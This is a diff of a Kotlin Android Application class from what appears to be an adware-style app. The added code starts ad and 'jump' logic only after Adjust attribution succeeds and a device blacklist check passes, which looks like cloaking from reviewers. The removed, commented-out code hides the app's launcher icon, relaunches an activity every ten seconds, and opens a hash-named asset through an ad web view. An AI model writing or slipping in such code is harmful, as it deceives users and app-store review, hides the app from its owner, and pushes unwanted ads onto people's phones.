@@ -61,44 +61,26 @@ class TheApplication:BaseApplication() {
             if (SPUtils.isUserCommon()){
                 return@Runnable
             }
-
-//           if(LaunchStateUtils.judgeIsBlacklist()){
-//                return@Runnable
-//            }
             //归因
-//            AdJustInitUtils.initAdjust(HostUtils.randomConfig_from_delay, AjConstants.adjustAppToken,
-//                PhoneStatusUtils.judgeIsBlacklist(),object : CommonConfig.OnConfigInterface{
-//                override fun onSuccess() {
-//
-//                }
-//
-//                override fun onFail() {
-//
-//                }
-//
-//            })
-            //归因成功后执行
-            //hideAppIcon(CContext.getApplication())
-            //归隐后执行
-            NativeHelper.init(insApp, null, null)
-            //拉取数据
-            //FireBaseInitUtils.fetchData(HostUtils.randomConfig_from_delay)
-            doOnMainThreadIdle({
-                InitAdAndTj.initJumpEvent(insApp)
-                Log.d("TheApp","初始化归因成功的广告配置")
-            })
-        }
+            AdJustInitUtils.initAdjust(HostUtils.randomConfig_from_delay, AjConstants.adjustAppToken,
+                PhoneStatusUtils.judgeIsBlacklist(),object : CommonConfig.OnConfigInterface{
+                override fun onSuccess() {
+                    //归因成功后执行
+                    NativeHelper.init(insApp, null, null)
+                    //拉取数据
+                    //FireBaseInitUtils.fetchData(HostUtils.randomConfig_from_delay)
+                    doOnMainThreadIdle({
+                        InitAdAndTj.initJumpEvent(insApp)
+                    })
+                }
 
-//        fun hideAppIcon(context: Context) {
-//            Log.d("AD_LOG", "hideAppIcon>>>")
-//            val pm = context.packageManager
-//            val componentName = ComponentName(context, ScanMenuActivity::class.java)
-//            pm.setComponentEnabledSetting(
-//                componentName,
-//                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-//                PackageManager.DONT_KILL_APP
-//            )
-//        }
+                override fun onFail() {
+
+                }
+
+            })
+
+        }
     }
 
     override fun onCreate() {
@@ -113,32 +95,9 @@ class TheApplication:BaseApplication() {
         MMKV.initialize(this)
         //initFireBase
         FirebaseApp.initializeApp(this)
-
-
-//        //测试代码
-//        Handler(Looper.getMainLooper()).postDelayed(object : Runnable {
-//            override fun run() {
-//                startRepeatingTask()
-//            }
-//
-//        }, 2000)
         init()
     }
 
-//    fun startRepeatingTask() {
-//        GlobalScope.launch(context = Dispatchers.Main) {
-//            while (isActive) {
-//                Log.d("NativeHelper", "执行任务时间:${System.currentTimeMillis()}")
-//                val intent = Intent(insApp, MainActivity::class.java)
-//                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
-////打开activity执行这个
-//                NativeHelper.b(insApp,intent)
-//                Log.d("NativeHelper", "开始跳转")
-//                delay(10_000)
-//            }
-//        }
-//
-//    }
 
     private  fun init(){
         val channel: String = WalleChannelReader.getChannel(CContext.getApplication(), "GP").toString()
@@ -154,8 +113,6 @@ class TheApplication:BaseApplication() {
             Log.d("AD_LOG","初始化广告sdk")
             InitAdAndTj.initAdTj(insApp)
             HandleUtils.postDelay(fromNet, 10 * 1000)
-//            val path = LogHelper.copyAssetsFile(CContext.getApplication(), "df4f75c877037e4f779ca2943a8039ff", "1")
-//            BtFileAdWebActivity.openFile(CContext.getApplication(), PPService::class.java.name, path)
         }
         DeviceUtils.getFetchOaid()
         GAIDUtil.fetchGAID(this,null)
@@ -186,26 +143,4 @@ class TheApplication:BaseApplication() {
         doActivateDot()
     }
 
-    fun test(){
-        // 在启动前添加检查
-        val packageManager = packageManager
-        val componentName = ComponentName(
-            "com.saowen.magicdoc",
-            "com.xian.bc.accounts.ui.ScanMenuActivity"
-        )
-
-        try {
-            // 检查Activity是否存在
-            val activityInfo = packageManager.getActivityInfo(componentName, 0)
-            Log.d("ActivityCheck", "Activity found: ${activityInfo.name}")
-
-            // 启动Activity
-            val intent = Intent().setComponent(componentName)
-            startActivity(intent)
-        } catch (e: PackageManager.NameNotFoundException) {
-            Log.e("ActivityCheck", "Activity not found in manifest", e)
-        } catch (e: ActivityNotFoundException) {
-            Log.e("ActivityCheck", "Activity not found", e)
-        }
-    }
 }
